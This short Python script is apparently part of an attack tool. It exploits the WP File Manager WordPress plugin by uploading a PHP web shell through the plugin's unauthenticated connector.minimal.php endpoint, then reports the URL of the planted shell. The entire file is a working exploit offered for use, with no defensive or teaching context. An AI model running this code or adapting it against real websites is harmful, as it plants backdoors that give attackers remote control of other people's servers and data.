import requests

def exploit(site_url):
    upload_url = f"{site_url}/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"

    files = {
        'upload[]': ('shell.php', open('payloads/simple_shell.php', 'rb'), 'application/x-php')
    }

    try:
        r = requests.post(upload_url, files=files, timeout=10)
        if r.status_code == 200:
            shell_url = f"{site_url}/wp-content/plugins/wp-file-manager/lib/files/shell.php"
            print(f"[+] WP File Manager exploited: {shell_url}")
            return True, shell_url
    except:
        pass
    print("[-] WP File Manager failed.")
    return False, None
